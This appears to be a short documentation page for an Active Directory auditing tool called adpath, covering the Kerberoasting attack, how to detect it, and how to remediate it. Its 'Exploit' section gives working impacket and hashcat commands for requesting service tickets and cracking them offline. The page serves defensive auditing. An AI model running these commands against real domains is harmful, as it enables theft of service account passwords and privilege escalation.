# Kerberoasting

**MITRE:** T1558.003

## How it works

Any authenticated domain user can request a Kerberos TGS ticket for any account that has a Service Principal Name (SPN). The ticket is encrypted with the account's password hash. The attacker extracts the ticket and cracks it offline — no lockout, no alerts by default.

```
Attacker → KDC: TGS-REQ for SPN http/webapp.corp.local
KDC → Attacker: TGS encrypted with svc_webapp's NTLM hash
Attacker → hashcat: crack offline
```

## Detection with adpath

```bash
adpath kerberos -d corp.local -u jdoe -p 'Password1' --dc 10.0.0.1
```

adpath finds all enabled accounts with SPNs set, excluding `krbtgt`. Severity is raised to Critical if the account has `adminCount=1` or is in a privileged group.

## Exploit

```bash
# Get hashes (impacket)
GetUserSPNs.py corp.local/jdoe:'Password1' -dc-ip 10.0.0.1 -request -outputfile tgs.txt

# Crack (hashcat)
hashcat -m 13100 tgs.txt wordlist.txt -r rules/best64.rule
```

## Remediation

1. Remove unnecessary SPNs from user accounts — use computer accounts or gMSA instead
2. Ensure service accounts have strong, long, random passwords (25+ chars)
3. Add service accounts to **Protected Users** group — forces AES encryption (RC4 hashes are much easier to crack)
4. Enable **Kerberos AES encryption** on service accounts: `msDS-SupportedEncryptionTypes = 24`
